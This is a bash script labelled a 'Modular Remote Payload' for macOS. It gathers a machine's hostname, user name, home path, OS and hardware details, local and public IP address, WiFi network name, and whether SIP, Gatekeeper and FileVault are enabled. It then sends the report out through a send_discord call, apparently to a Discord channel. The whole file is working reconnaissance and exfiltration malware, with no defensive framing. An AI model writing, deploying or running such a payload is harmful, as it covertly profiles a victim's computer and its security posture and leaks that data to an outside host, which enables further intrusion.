#!/bin/bash
# ============================================================
# System Information for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="💻 **System Info from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Identity
OUTPUT+="**📍 IDENTITY**\n"
OUTPUT+="• Hostname: \`$(hostname)\`\n"
OUTPUT+="• User: \`$(whoami)\`\n"
OUTPUT+="• Home: \`$HOME\`\n"
OUTPUT+="• Shell: \`$SHELL\`\n\n"

# macOS Info
OUTPUT+="**🍎 macOS**\n"
OUTPUT+="• Version: \`$(sw_vers -productVersion)\`\n"
OUTPUT+="• Build: \`$(sw_vers -buildVersion)\`\n"
OUTPUT+="• Architecture: \`$(uname -m)\`\n\n"

# Hardware
OUTPUT+="**⚙️ HARDWARE**\n"
OUTPUT+="• Model: \`$(sysctl -n hw.model)\`\n"
OUTPUT+="• CPU: \`$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "Apple Silicon")\`\n"
OUTPUT+="• RAM: \`$(( $(sysctl -n hw.memsize) / 1073741824 )) GB\`\n"
OUTPUT+="• Disk: \`$(df -h / | awk 'NR==2 {print $4}')\` free\n\n"

# Network
OUTPUT+="**🌐 NETWORK**\n"
OUTPUT+="• Local IP: \`$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1)\`\n"
PUB_IP=$(curl -s https://api.ipify.org 2>/dev/null)
OUTPUT+="• Public IP: \`$PUB_IP\`\n"
OUTPUT+="• WiFi SSID: \`$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null | awk '/ SSID/ {print $2}')\`\n\n"

# Security
OUTPUT+="**🛡️ SECURITY**\n"
SIP=$(/usr/bin/csrutil status 2>/dev/null | grep -o "enabled\|disabled")
OUTPUT+="• SIP: \`$SIP\`\n"
GATEKEEPER=$(spctl --status 2>/dev/null)
OUTPUT+="• Gatekeeper: \`$GATEKEEPER\`\n"
FV=$(fdesetup status 2>/dev/null)
OUTPUT+="• FileVault: \`$FV\`\n"

send_discord "$OUTPUT"

